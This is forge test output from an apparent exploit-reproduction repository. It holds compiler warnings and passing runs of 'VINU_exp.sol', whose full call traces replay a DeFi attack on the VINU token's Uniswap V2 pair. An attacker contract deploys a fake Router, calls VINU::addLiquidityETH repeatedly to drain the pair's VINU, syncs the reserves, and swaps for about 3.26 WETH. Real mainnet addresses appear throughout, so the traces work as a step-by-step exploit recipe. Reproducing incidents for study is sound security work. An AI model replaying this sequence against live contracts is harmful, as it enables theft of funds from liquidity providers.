Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-06/VINU_exp.sol:22:5:
   |
22 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-06/VINU_exp.sol:83:5:
   |
83 |     function WETH() external view returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-06/VINU_exp.sol:63:9:
   |
63 |         flashbotsAddress.call{value: 0.000000001 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2023-06/VINU_exp.sol:83:5:
   |
83 |     function WETH() external view returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2023-06/VINU_exp.sol:87:5:
   |
87 |     function approve(address spender, uint256 amount) external returns (bool) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
  --> src/test/2023-06/VINU_exp.sol:91:5:
   |
91 |     function createPair(address tokenA, address tokenB) external returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2023-06/VINU_exp.sol:95:5:
   |
95 |     function addLiquidityETH(
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 256.60ms (134.49µs CPU time)

Ran 1 test for src/test/2023-06/VINU_exp.sol:VinuTest
[PASS] testExploit() (gas: 464074)
Logs:
  Attacker's contract ETH balance before attack: 0.500000000000000000
  Attacker's contract WETH balance before attack: 0.000000000000000000
  Attacker's contract ETH balance after attack: 0.399999999000000000
  Attacker's contract WETH balance after attack: 3.256513152378912968

Traces:
  [512274] VinuTest::testExploit()
    ├─ emit log_named_decimal_uint(key: "Attacker's contract ETH balance before attack", val: 500000000000000000 [5e17], decimals: 18)
    ├─ [2534] WETH::balanceOf(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2444] WETH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker's contract WETH balance before attack", val: 0, decimals: 18)
    ├─ [151778] UniswapV2Router02::swapExactETHForTokens{value: 100000000000000000}(0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049683 [1.686e9])
    │   ├─ [2504] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8::getReserves() [staticcall]
    │   │   └─ ← [Return] 3331124883166006871 [3.331e18], 481195916974392513 [4.811e17], 1686049235 [1.686e9]
    │   ├─ [23974] WETH::deposit{value: 100000000000000000}()
    │   │   ├─ emit Deposit(dst: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], wad: 100000000000000000 [1e17])
    │   │   └─ ← [Stop] 
    │   ├─ [8062] WETH::transfer(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 100000000000000000 [1e17])
    │   │   ├─ emit Transfer(from: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], to: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, value: 100000000000000000 [1e17])
    │   │   └─ ← [Return] true
    │   ├─ [100543] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8::swap(0, 13983585451343353 [1.398e16], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [65588] VINU::transfer(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13983585451343353 [1.398e16])
    │   │   │   ├─ [27477] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13983585451343353 [1.398e16])
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000031adff33837df90000000000000000000000000000000000000000000000000031adff33837df9
    │   │   │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13983585451343353 [1.398e16])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WETH::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   │   └─ ← [Return] 3431124883166006871 [3.431e18]
    │   │   ├─ [598] VINU::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   │   └─ ← [Return] 467212331523049160 [4.672e17]
    │   │   ├─ emit Sync(reserve0: 3431124883166006871 [3.431e18], reserve1: 467212331523049160 [4.672e17])
    │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 100000000000000000 [1e17], amount1In: 0, amount0Out: 0, amount1Out: 13983585451343353 [1.398e16], to: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [100000000000000000 [1e17], 13983585451343353 [1.398e16]]
    ├─ [105753] → new Router@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 528 bytes of code
    ├─ [56155] VINU::addLiquidityETH(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8)
    │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], value: 373769865218439328 [3.737e17])
    │   ├─ emit Approval(owner: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], spender: Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
    │   ├─ [234] Router::factory() [staticcall]
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [202] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   ├─ [526] Router::createPair(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [679] Router::addLiquidityETH(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 373769865218439328 [3.737e17], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9])
    │   │   └─ ← [Return] 0, 0, 0
    │   ├─ [354] Router::approve(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [10155] VINU::addLiquidityETH(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8)
    │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], value: 74753973043687865 [7.475e16])
    │   ├─ emit Approval(owner: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], spender: Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
    │   ├─ [234] Router::factory() [staticcall]
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [202] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   ├─ [526] Router::createPair(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [679] Router::addLiquidityETH(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 74753973043687865 [7.475e16], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9])
    │   │   └─ ← [Return] 0, 0, 0
    │   ├─ [354] Router::approve(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [10155] VINU::addLiquidityETH(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8)
    │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], value: 14950794608737573 [1.495e16])
    │   ├─ emit Approval(owner: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], spender: Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
    │   ├─ [234] Router::factory() [staticcall]
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [202] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   ├─ [526] Router::createPair(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [679] Router::addLiquidityETH(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 14950794608737573 [1.495e16], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9])
    │   │   └─ ← [Return] 0, 0, 0
    │   ├─ [354] Router::approve(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [10155] VINU::addLiquidityETH(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8)
    │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], value: 2990158921747515 [2.99e15])
    │   ├─ emit Approval(owner: VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], spender: Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
    │   ├─ [234] Router::factory() [staticcall]
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [202] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   ├─ [526] Router::createPair(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
    │   │   └─ ← [Return] Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [679] Router::addLiquidityETH(VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 2990158921747515 [2.99e15], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9])
    │   │   └─ ← [Return] 0, 0, 0
    │   ├─ [354] Router::approve(Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [7650] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8::sync()
    │   ├─ [534] WETH::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   └─ ← [Return] 3431124883166006871 [3.431e18]
    │   ├─ [598] VINU::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   └─ ← [Return] 747539730436879 [7.475e14]
    │   ├─ emit Sync(reserve0: 3431124883166006871 [3.431e18], reserve1: 747539730436879 [7.475e14])
    │   └─ ← [Stop] 
    ├─ [598] VINU::balanceOf(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 13983585451343353 [1.398e16]
    ├─ [598] VINU::balanceOf(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 13983585451343353 [1.398e16]
    ├─ [11024] VINU::transfer(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 13983585451343353 [1.398e16])
    │   ├─ [6113] 0xBd21422d8dDd57CfFAE72587169A22b2462dC761::swapExactTokensForETHSupportingFeeOnTransferTokens(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 13983585451343353 [1.398e16])
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000031adff33837df90000000000000000000000000000000000000000000000000031adff33837df9
    │   ├─ emit Transfer(from: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, value: 13983585451343353 [1.398e16])
    │   └─ ← [Return] true
    ├─ [504] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8::getReserves() [staticcall]
    │   └─ ← [Return] 3431124883166006871 [3.431e18], 747539730436879 [7.475e14], 1686049583 [1.686e9]
    ├─ [0] flashbotsAddress::fallback{value: 1000000000}()
    │   └─ ← [Stop] 
    ├─ [1021] UniswapV2Router02::getAmountOut(13983585451343353 [1.398e16], 747539730436879 [7.475e14], 3431124883166006871 [3.431e18]) [staticcall]
    │   └─ ← [Return] 3256513152378912968 [3.256e18]
    ├─ [36401] 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8::swap(3256513152378912968 [3.256e18], 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [23162] WETH::transfer(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3256513152378912968 [3.256e18])
    │   │   ├─ emit Transfer(from: 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, to: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3256513152378912968 [3.256e18])
    │   │   └─ ← [Return] true
    │   ├─ [534] WETH::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   └─ ← [Return] 174611730787093903 [1.746e17]
    │   ├─ [598] VINU::balanceOf(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8) [staticcall]
    │   │   └─ ← [Return] 14731125181780232 [1.473e16]
    │   ├─ emit Sync(reserve0: 174611730787093903 [1.746e17], reserve1: 14731125181780232 [1.473e16])
    │   ├─ emit Swap(sender: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 13983585451343353 [1.398e16], amount0Out: 3256513152378912968 [3.256e18], amount1Out: 0, to: VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Attacker's contract ETH balance after attack", val: 399999999000000000 [3.999e17], decimals: 18)
    ├─ [534] WETH::balanceOf(VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 3256513152378912968 [3.256e18]
    ├─ [444] WETH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker's contract WETH balance after attack", val: 3256513152378912968 [3.256e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 280.39ms (1.42ms CPU time)

Ran 2 test suites in 538.50ms (536.99ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
